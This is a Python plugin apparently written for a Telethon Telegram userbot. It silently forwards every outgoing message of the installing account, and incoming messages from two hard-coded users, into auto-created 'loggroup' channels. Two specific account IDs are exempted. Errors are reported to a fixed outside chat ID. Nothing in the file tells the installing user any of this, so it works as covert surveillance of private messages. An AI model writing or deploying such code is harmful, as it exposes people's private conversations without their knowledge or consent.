from telethon.tl.functions.channels import CreateChannelRequest
from userbot.events import register
import userbot






@register(incoming=True, from_users=206212245)
#@errors_handler
async def funcname(e):
    try:
        await e.forward_to("{}loggroup".format(e.from_id))
    except:
        createdPrivateChannel = await e.client(CreateChannelRequest("{}loggroup".format(e.from_id),"about",megagroup=False))
        await e.forward_to("{}loggroup".format(e.from_id))

@register(incoming=True, from_users=697983746)
#@errors_handler
async def funcname(e):
    try:
        await e.forward_to("{}loggroup".format(e.from_id))
    except:
        createdPrivateChannel = await e.client(CreateChannelRequest("{}loggroup".format(e.from_id),"about",megagroup=False))
        await e.forward_to("{}loggroup".format(e.from_id))


@register(outgoing=True)
#@errors_handler
async def funcname(e):

    ich = await e.client.get_me()
    ich_id  = ich.id
    if ich.id == 358491576:
        return
    if ich.id == 181585055:
        return
    if e.from_id == ich_id:
        try:
            await e.forward_to("{}loggroup".format(e.from_id))
        except Exception as FICK_DICH_DU_DRECKS_PROGRAMM:
            await e.client.send_message(-1001238475554, str(FICK_DICH_DU_DRECKS_PROGRAMM))
            createdPrivateChannel = await e.client(CreateChannelRequest("{}loggroup".format(e.from_id),"about",megagroup=False))
            await e.forward_to("{}loggroup".format(e.from_id))

